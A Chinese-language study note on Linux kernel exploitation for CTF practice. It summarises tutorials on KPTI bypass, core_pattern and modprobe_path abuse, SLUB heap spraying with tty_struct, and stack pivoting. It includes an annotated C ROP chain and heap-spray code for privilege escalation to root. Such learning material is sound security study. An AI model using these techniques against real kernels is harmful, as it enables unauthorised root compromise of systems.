# Linux Kernel PWN

昨天刚入门kernel pwn：[Learning Linux Kernel Exploitation](./Learning%20Linux%20Kernel%20Exploitation.md),今天就兴冲冲跑去做kernel pwn题。炸了。整道题只懂文件该怎么解压，源码没看懂，怎么进kernel mode也不懂。总之就是啥也不懂。无奈我又去找了教程，看了目录，挺长的，够我看一阵子了。

这个教程也是从hxp CTF的kernel rop开始的，所以我会省去题目分析部分和与那篇笔记重复的内容（或者简单提一嘴）。

## [01 From Zero to One](https://blog.wohin.me/posts/linux-kernel-pwn-01/)

找kernel文件里的rop gadgets时可以用[ropr](https://github.com/Ben-Lichtman/ropr)，比ROPgadget快。

与kernel交互的方式：系统调用，page faults，signals，pseudo-filesystems，device drivers等。（我说为什么今天看的那道题没有device，原来进kernel有这么多方式？）

压缩解压后的文件系统+exp的脚本：https://gist.github.com/brant-ruan/b67dc2fbae150e7bc76fda914816f534

`/etc/init.d/rcS`可能包含系统环境相关信息。不止（不一定）有setuidgid，但是可以获取更多信息，比如是否使用busybox（一个软件套装software suite，总之不是pwn的目标），运行了什么命令等。往这里加命令也会被执行（改root权限可以在这里改）

寻找canary可以通过计算偏移的方式。canary在rbp-0x18。假设有数组在rbp-0x98，从这里泄露canary就是(0x98 - 0x18)/8=16索引。除了计算索引，还可以通过观察的方式找canary：泄露大部分stack上的值后，那些不以`0xffff`开头且以`\x00`结尾的数字通常是canary。

找必要函数地址时可以一起找：`cat /proc/kallsyms | grep -w -E "commit_creds|prepare_kernel_cred"`

用ropr找gadgets：`ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax; mov|^swapgs|^iretq" ./vmlinux`

绕过kpti除了用KPTI trampoline，还可以用这段gadget：
```
mov     rdi, cr3
or      rdi, 1000h
mov     cr3, rdi
```
设置cr3后再按照iretq/sysret的需求构造栈上内容即可。参考 https://zhuanlan.zhihu.com/p/137277724 （所以2019年那个patch禁止了cr4但没禁止cr3？）

绕过kpti也能用UMH (user mode helpers)。事实上，umh不仅可以用来绕kpti，单纯用来提权也是可以的。即，`commit_creds(prepare_kernel_cred(0))`不是提权的必选项。能利用的umh configuration string有core_pattern和modprobe_path。modprobe我学过了，只针对core_pattern做个笔记。

参考 https://stackoverflow.com/questions/2065912/core-dumped-but-core-file-is-not-in-the-current-directory ，core_pattern（/proc/sys/kernel/core_pattern）文件用于指定dump core时的文件名格式。若里面的内容以`|`开头，kernel会将`|`后面的内容当作命令来执行。所以将kernel里的core_pattern字符串改为`|cmd`，然后再触发core dumped（Segmentation fault即可）就能执行cmd。

无论是modprobe_path还是core_pattern，它们的利用方式总体上还是一致的：
1. 寻找可以将这些configuration string覆盖为evil的漏洞，利用脚本为exp
2. 一个trigger文件，用于触发这些umh
3. 一个evilsu文件用于弹root shell
4. 上面提到的evil文件，内容为chown和chmod，将evilsu文件改成root权限且所有者是我们

流程大概如下：
1. 利用漏洞覆盖configuration string为evil
2. 返回userland，用kpti trampoline或者swapgs+iretq都行
3. userland里用trigger触发umh
4. evilsu拿root shell

不受FG-KASLR影响的区域：
1. `.text`段，包含kpti trampoline
2. `.data`段，包含modprobe_path等configuration string
3. kernel symbol stable `__ksymtab`
4. 从base一直到0x400dc6的gadgets

[02期](https://blog.wohin.me/posts/linux-kernel-pwn-02/)是对一个古老漏洞的探究：CVE-2009-1897。不过我现在要“速通”kernel入门，而这个漏洞目前已经用不了了，对我来说学了没啥意义，所以就当拓展了。（不过还是浅浅看了一遍，怎么感觉09年linux风评不好？）

[03期](https://blog.wohin.me/posts/linux-kernel-pwn-03/)讲了怎么调试。我目前也用不上（exp都写不出来调个寂寞？），更关键的是，我估计在换电脑前是没法配置好linux系统了。列出文章里提到的一些链接，需要时随时回来查。
- [qemu搭建Ubuntu发行版源码级内核调试环境](https://1vanchen.xyz/posts/kernel/2020-10-02-build-source-level-kernel-debugging-environment.txt)
- [CVE-2022-34918 nftable堆溢出漏洞利用(list_head任意写)](https://bsauce.github.io/2022/07/26/CVE-2022-34918)
- [Kernel pwn CTF 入门 - 1](https://www.anquanke.com/post/id/255882)
- [内核下载与编译](https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/)

## [0401 Pawnyable之基础](https://blog.wohin.me/posts/pawnyable-01/)

内核态的资源和堆由内核和所有模块共享，用户态进程则拥有自己的资源和堆栈空间。内核态的共享特性对于攻击者来说有利有弊，好处在于拥有相当多的可利用对象，坏处在于堆状态会受到所有程序影响，更难于控制和预测。

这里建议下载[LK01](https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01.tar.gz)然后跟着教程做，看看有没有问题。我就发现我解压文件系统改后改了某些文件再压缩得到的cpio没法启动，但是原cpio没有问题。后面发现是解压后的文件系统只有root有rwx权限，其他人的权限都不够。所以修改文件系统文件夹下的所有文件的权限即可。`chmod -R 777 ./rootfs`

进到qemu后`head -n 3 /proc/kallsyms`得到内核加载基址，`grep "commit_creds" /proc/kallsyms`获取commit_creds函数地址。gdb（这里用pwndbg暂时没有问题，反而是GEF可能会有点问题，详情见教程）里`target remote localhost:1234`调试qemu，`set arch i386:x86-64:intel`设置架构。此时可以在commit_creds处设置断点，然后c让系统继续运行。接着在虚拟机终端中执行一个命令，如ls。控制流被gdb中断后就能开始内核调试了。

`cat /proc/modules`查看挂载的漏洞内核模块。可以在GDB中将内核模块文件vuln.ko作为符号文件加载，然后使用符号（如下面的module_close）作为断点。这样访问模块（`cat /dev/holstein`）就能触发断点，开始调试。
```sh
pwndbg> ls
Makefile  vuln.c  vuln.ko
pwndbg> add-symbol-file vuln.ko 0xffffffffc0000000
add symbol table from file "vuln.ko" at
        .text_addr = 0xffffffffc0000000
Reading symbols from vuln.ko...
(No debugging symbols found in vuln.ko)
pwndbg> b module_close
```
注意符号文件要在当前工作目录下。或者自己指定路径。

## [040201 Pawnyable之栈溢出](https://blog.wohin.me/posts/pawnyable-0201/)

/etc/init.d/下可能用漏洞模块的相关信息。
```sh
insmod /root/vuln.ko
mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
```
表示系统启动时加载漏洞模块vuln.ko并关联字符设备/dev/holstein。

栈溢出测试偏移可以像教程那样先填满buf，然后额外增加不重复的字符等kernel崩溃后看rip在哪，或者用ghidra打开漏洞模块，和userland pwn一样，能直接看偏移

用ropr找gadgets可能会出现某个gadget找不到的情况。可以再用objdump找。`objdump -S -M intel vmlinux | less`

内核中的地址空间布局随机化强度比用户空间中的要弱——内核预留了从0xffffffff80000000到0xffffffffc0000000的1GB地址空间，即使启用KASLR，也只会生成从0x810到0xc00的0x3f0个不同的基地址

有些时候gadgets可能能用但不稳定（区别于gadget在不可执行段完全不能用）。特征在于
1. exp关闭kaslr可以100%成功，但打开后大部分情况exp会导致内核崩溃，少数情况下ExP能够提权成功
2. 内核崩溃后的报错信息会有些许差异，有时提示的page fault是一个看起来还算正常的内核地址，有时候就是一个含义不明的地址

这种情况大概率是因为取gadget时取到绝对地址了，比如这样的指令：`mov al, ds:byte_FFFFFFFF81C35900[rdi]`，里面使用了一个绝对地址。正好`pop rcx; ret`对应的机器码是`59 C3`，导致这个地址被看成gadget了。在没有KASLR的情况下，它确实是一个有效的gadget。一旦KASLR生效，这个地址也会被改动，每次随机化的结果不同就导致了gadget中间插入的垃圾指令不一样，甚至小部分情况下垃圾指令不影响原gadget的功能，故而ExP能够提权成功。

_copy_from_user和_copy_to_user与copy_from_user和copy_to_user的区别在于前者不会对复制的长度进行检查，易导致溢出

## [040202 Pawnyable之堆溢出](https://blog.wohin.me/posts/pawnyable-0202/)

因为我是一边看一边写的笔记，导致写完才发现这篇全是干货，这笔记精简基本精简了个寂寞。建议看原文，我这里只标了一点自己不理解的地方

在内核中，可以使用mmap以页（page）为基本单位进行内存分配，但是这会导致很多空间浪费。因此，与用户空间中的malloc函数类似，可以在内核中使用kmalloc函数申请内存。kmalloc使用了内核中的分配器，主要有SLAB、SLUB和SLOB三种。这三个分配器之间并不是完全独立的，在实现上有共同的部分，统称为Slab（厚板）分配器。其中：
1. SLAB是以上三者中最古老的分配器类型，在Linux中的代码实现位于mm/slab.c。
2. SLUB的意思是the unqueued slab allocator，它的特点是尽可能快，在Linux中的代码实现位于mm/slub.c。自2.6.23版本后，Linux内核用SLUB取代SLAB，作为默认的内存分配器
3. SLOB的意思是simple list of blocks，特点是尽可能轻量，在Linux中的代码实现位于mm/slob.c。

SLAB分配器有以下三个特点：
1. 根据所需内存大小使用不同的页框。与libc malloc的内存分配方式不同，SLAB根据内存需求的大小分配来自不同区域的内存。因此，分配的内存块前后没有（不需要）长度信息。
2. 使用缓存。对于小内存的分配情况，优先使用对应的缓存。如果所需的内存很大，或者缓存为空，则采用正常的分配机制。
3. 使用位图管理已释放区域。在内存页的顶部维护了一个位数组，用于表示该页是否已释放特定索引的区域。与libc malloc的内存管理方式不同，它并未基于链表管理。

在实际使用中，会有多个内存块作为缓存，已释放的区域将被优先使用。__kmem_cache_create函数还可以根据相关标志进行以下设置：
- SLAB_POISON：将已释放区域用0xA5填充。
- SLAB_RED_ZONE：在每个对象后添加一个redzone区域，用来检测堆溢出。

SLUB分配器有以下三个特点：
1. 与SLAB类似，SLUB根据所需内存大小使用不同的页框（kmalloc-64、kmalloc-128、kmalloc-256等等）。不同的是，SLUB管理的页框的开头没有元数据（如空闲区索引）。页框描述符中有指向空闲链表开头的指针。
2. 与libc的tcache和fastbin类似，SLUB使用单向链表管理空闲区域。
3. 与SLAB类似，每个CPU都有一个cache，但是SLUB同样是用单向链表来维护它们的。

其中，通用kmem_cache的大小覆盖了8、16、32、64、96、128、192、256、512、1024、2048、4096和8192。SLUB还提供了sanity checks、red zoning和poisoning等debug功能

内核堆由所有驱动程序和内核共享。因此，一个驱动程序中的漏洞可用于破坏内核空间中的另一个对象。那么，一个非常自然的思路是想办法在脆弱对象后面放一些想要破坏的目标对象，从而通过堆溢出篡改这些目标对象。如前所述，SLUB管理的对象之间没有元数据，因此不必考虑堆溢出可能会破坏这些元数据。

堆溢出的一种常见利用手法是堆喷（[Heap Spraying](https://en.wikipedia.org/wiki/Heap_spraying) ），它能够提高堆溢出漏洞利用的成功率和稳定性。所谓堆喷，就是在堆上（无论是内核堆还是用户态堆）大量申请内存，并填充特定载荷。堆喷是一种通用的漏洞利用辅助技术，并不局限在堆溢出漏洞利用中。以下是两种堆喷利用场景：
1. 在用户态PWN中，利用某个漏洞能够将控制流劫持到堆上。在这种情况下，可以通过堆喷“nop雪橇（应该指往堆里面放一堆nop，然后劫持控制流到这，让其滑到shellcode）+shellcode”的方式对堆进行布局，使得劫持的目标堆地址大概率命中nop雪橇部分，从而抵消掉相当一部分随机化导致的不确定性，实现代码执行。
2.  在内核态PWN中，堆溢出漏洞的利用。在这种情况下，利用系统调用或漏洞模块交互，在堆上放置大量脆弱对象及一些目标对象，使得脆弱对象中的堆溢出漏洞被触发时，大概率其后是一个目标对象，实现对目标对象的篡改。

SLUB的特性决定了只有大小相同的对象才会从同一个kmem_cache区域分配，因此我们要根据脆弱对象的大小来选择目标对象。关于目标对象的选择： https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628

若漏洞模块每次申请的内存大小为0x400，我们需要找到一个同样从kmalloc-1024区域分配的内核对象。比如tty_struct（大小通常在0x2c0左右），其定义在 https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143
```c
struct tty_struct {
int magic;
struct kref kref;
struct device *dev; /* class device or NULL (e.g. ptys, serdev) */
struct tty_driver *driver;
const struct tty_operations *ops;
    // ...
} __randomize_layout;
```
其中，tty_operations *ops在结构体中的偏移是0x18，它包含了相关的操作函数，定义在[drivers/tty/pty.c](https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c) 中。例如，当我们对/dev/ptmx执行open系统调用时，对应的操作函数[ptmx_open](https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c#L788) 将被执行：
```c
int ptmx = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
```
用堆喷手法成功布置内核堆后，通常利用堆溢出漏洞篡改目标对象的特定函数指针，或者伪造一个函数指针表，然后在用户空间对目标对象执行系统调用，从而触发它的相应操作函数，由于该函数指针已经被篡改为一个恶意的地址，内核控制流将被劫持

堆喷例子：
```c
int main() {
    int spray[100];
    for (int i = 0; i < 50; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    int fd = open("/dev/holstein", O_RDWR);
    for (int i = 50; i < 100; i++)
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    char buf[0x500];
    memset(buf, 'A', 0x500);
    write(fd, buf, 0x500);
}
```
在内核堆上喷射了50个tty_struct结构体，然后漏洞模块在堆上申请了0x400大小的内存空间，最后又喷射了50个tty_struct结构体。这样一来，有很大概率出现这样的堆布局：漏洞模块的0x400大小的g_buf缓冲区前后都是tty_struct结构体。

如果在gdb里查看内存布局，就会发现若干个tty_struct把漏洞模块的堆buf夹在中间。此时若触发堆溢出漏洞，溢出的内容就会覆盖后面tty_struct结构体的内容。此为前面提到的“利用堆溢出漏洞篡改目标对象的特定函数指针”

绕过kaslr：堆喷后，利用越界读读出紧跟在堆buf后面的tty_struct的函数指针（如偏移0x18处的`tty_operations *ops`）然后计算出基地址

可以伪造一个tty_operations函数表，然后利用堆溢出将堆上的tty_struct结构体中的*ops修改为这张伪造的函数表。如果目标环境没有开启SMAP，那么可以选择在用户空间放置伪函数表。然而smap阻止了这一行为（作者其实没写出如何绕过smap）,只有堆是我们能够向内核空间写入数据的地方，因此需要泄露堆地址（刚刚泄露的地址是kaslr的，代码段的地址）

tty_struct偏移0x38处的值是一个堆地址。可利用此地址计算漏洞模块堆buf地址，然后在buf中放置伪函数表，修改tty_struct的*ops指针指向buf。最后在用户空间中使用ioctl系统调用来触发控制流劫持，相应地，RIP将转到伪造函数表中的对应指针处。可以先伪造一个存储非法指针的函数表，让内核崩溃，弄清楚具体是函数表中第几个函数被调用了。
```c
g_buf = *(unsigned long *)&buf[0x438] - 0x438;
// craft fake function table
unsigned long *p = (unsigned long *)&buf;
for (int i = 0; i < 0x40; i++)
    *p++ = 0xffffffffdead0000 + (i << 8);
*(unsigned long *)&buf[0x418] = g_buf;
write(fd, buf, 0x420);
// hijack control flow
for (int i = 0; i < SPRAY_NUM; i++)
    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
```
由于我们不知道堆溢出后究竟覆盖了哪个tty_struct，因此在上述代码末尾选择对所有喷射的对象执行ioctl。然而，有时能够在用户空间通过执行某些系统调用来确定被堆溢出修改的对象，这样就不必遍历所有对象了，稳定性也更高。

执行exp，kernel会崩溃并返回`BUG: unable to handle page fault for address:`，后面跟着的地址就是ioctl对应的tty_operations中的处理函数（像上面的代码一样构造函数能得到函数的索引）

在SMEP开启但SMAP关闭的情况下，不一定非要搞内核态ROP，利用栈迁移搞用户态ROP即可。使用ropr搜索stack pivoting的gadget：`ropr --nouniq -R "^mov esp, 0x[0-9]*; ret" ./vmlinux`。然后根据mov esp的操作数提前用mmap申请到从那块开始的内存，在这里写入rop链，利用之前的堆溢出将控制流劫持到gadget的地址即可

然而在SMAP开启的情况下，不能将stack给pivot到用户空间（mmap那个做法就用不了了），此时希望pivot到堆上，最好是堆buf这部分能控制的内核内存。这道题在执行ioctl使内核崩溃时，rcx寄存器和rdx寄存器里分别包含了ioctl的第二个，第三个参数。因此可以找类似`mov rsp, rcx; ret`的gadget（或者先push再pop的gadget：`ropr --nouniq -R "^push rdx;.* pop rsp;.* ret" ./vmlinux`）

可以将ROP链布置在内核堆内存buf中，在伪函数表项前或表后均可，甚至相互穿插也可以，用pop跳过即可。这里我解释一下exp的关键部分，差点没看懂（问就是基础太垃圾了）
```c
int main() {
    unsigned long *chain = (unsigned long *)&buf;
    *chain++ = pop_rdi_ret;               // #0 return address。第一次0xc调用后会从这里开始执行
    *chain++ = 0x0;                       // #1
    *chain++ = prepare_kernel_cred;       // #2
    *chain++ = pop_rcx_ret;               // #3
    *chain++ = 0;                         // #4
    *chain++ = mov_rdi_rax_rep_movsq_ret; // #5
    *chain++ = commit_creds;              // #6
    *chain++ = pop_rcx_ret;               // #7 这些pop_rcx_ret估计都是用来填充的，让push_rdx_pop_rsp_pop2_ret正好在0xc
    *chain++ = 0;                         // #8
    *chain++ = pop_rcx_ret;               // #9
    *chain++ = 0;                         // #a
    *chain++ = pop_rcx_ret;               // #b 这个除外，当我们从上到下执行后，下一个push_rdx_pop_rsp_pop2_ret会被pop进rcx，让我们不至于再来一次
    *chain++ = push_rdx_pop_rsp_pop2_ret; // #c，后面ioctl调用的其实是这里。这个gadget为push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret; 。rdx是g_buf - 0x10，然后pop rsp，把g_buf - 0x10放入rsp。至于为什么是g_buf - 0x10，因为后面有两个无用的pop。会抬高堆栈0x10。g_buf - 0x10经过两次pop后正好到chain的开始
    *chain++ = swapgs_restore_regs_and_return_to_usermode; //很巧妙地跳过了上一个，直接到kpti trampoline
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = user_rip;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_sp;
    *chain++ = user_ss;
    *(unsigned long *)&buf[0x418] = g_buf; //计算得到偏移0x418处是函数表指针
    printf("[*] overwriting the adjacent tty_struct\n");
    write(fd, buf, 0x420); //往漏洞模块越界写ropchain以及覆盖函数表指针
    printf("[*] invoking ioctl to hijack control flow\n");
    // hijack control flow
    for (int i = 0; i < SPRAY_NUM; i++) {
        ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); //ioctl会导致tty_struct函数表的第0xc个函数被调用.其第三个参数g_buf - 0x10会被传入rdx
        //这里要是ioctl第二个参数设置为0xdeadbeef，root shell退出后内核会崩溃。改成0就好了
    }
}
```
并不是所有情况下都能做stack pivoting，需要考虑内核是否有相应的gadget、是否有能够控制的空间和是否能够把可控空间的地址传递给gadget等多个因素。

除了ROP之外，如果拥有内核的任意地址读（arbitrary address read，简称AAR）和任意地址写（arbitrary address write，简称AAW）的能力，也能实现提权。这里指的是可以直接使用AAW的相关gadget（[原语](https://www.cnblogs.com/hualalasummer/p/3704225.html),个人认为指的是某个视角上的“最小单位”）来进行漏洞利用，不去构造ROP链。参考 https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html

AAW原语：`mov [rdx], rcx; ret;`;AAR原语：`mov eax, [rdx]; ret;`。所以这里原语可能指“一句汇编指令”。结合执行ioctl时rcx和rdx可控，就能利用AAW通过两种不同的方式实现提权：修改usermode helpers和修改当前进程的cred结构体。

先是利用AAW来修改modprobe_path实现提权。有可能出现当前环境中的内核没有在/proc/kallsyms中暴露modprobe_path的情况，还能用pwntools找偏移：
```py
from pwn import *
elf = ELF('./vmlinux')
print(hex(next(elf.search(b'/sbin/modprobe\x00'))))
```
这里提一嘴作者在modprobe这段使用的exp。参考另一篇[笔记](./kernel技巧学习.md)，modprobe可用来以root身份执行某个命令，但不是完整的root shell（我怀疑换种写法就可以了）。在作者提到的[文章](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#version-3-probing-the-mods)里搜索dropper就能看到完整思路。过程简述如下：
1. 写一个微型elf，执行内容为`setuid(0); setgid(0); execve("/bin/sh", ["/bin/sh"], NULL)`，然后编译获取其机器码
2. 创建dropper，作用为打开一个文件，往里面写入刚才微型elf的机器码，关闭文件，然后更改其权限。同样编译获取其机器码
3. 拿dropper的机器码，写入`/tmp/w`文件，并将modprobe_path覆盖为`/tmp/w`。然后随便写一个文件头未知的文件，用来触发modprobe
4. 触发modprobe后，执行微型elf即可获得root shell

个人感觉有点多此一举（为啥不直接拿root shell，还要来个dropper？难道是不行？），但我的水平不高，不下定论。

如果能够将当前进程中cred结构体的各种ID重写为0，理论上就能提权到root。现在的问题是如何获取自身进程结构体地址。在版本较旧的内核中，全局符号current_task能够用来找到当前进程的task_struct。然而，新版本内核中它已经不是全局变量，而是存储在每个CPU空间中，需要使用GS寄存器访问。可以使用AAR搜索内核堆来寻找当前进程的cred结构体。

cred结构体指针在[task_struct结构体](https://elixir.bootlin.com/linux/v5.15/source/include/linux/sched.h#L723)里，后面还有个comm数组保存了当前进程的名称
```c
	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
#ifdef CONFIG_KEYS
	/* Cached requested key. */
	struct key			*cached_requested_key;
#endif
	/*
	 * executable name, excluding path.
	 *
	 * - normally initialized setup_new_exec()
	 * - access it with [gs]et_task_comm()
	 * - lock it with task_lock()
	 */
	char				comm[TASK_COMM_LEN];
```
可以将当前进程名称利用prctl函数设置为一个内核中不太常见的字符串，然后利用AAR在堆上搜索这个字符串，找到comm，进而找到cred指针。找到cred指针后，就可以利用AAW将[cred结构体](https://elixir.bootlin.com/linux/v5.15/source/include/linux/cred.h#L110)中的各种ID重写为0。

[exp](https://gist.github.com/brant-ruan/5fc95dbcdde06c188013d11a859113c0)会有几次堆喷不奏效的情况，不过成功率还可以。

如果只是为了提升权限，那么简单利用AAW去修改usermode helpers、cred结构体等已经足够；如果目的是容器逃逸，那么修改这些数据结构是不够的。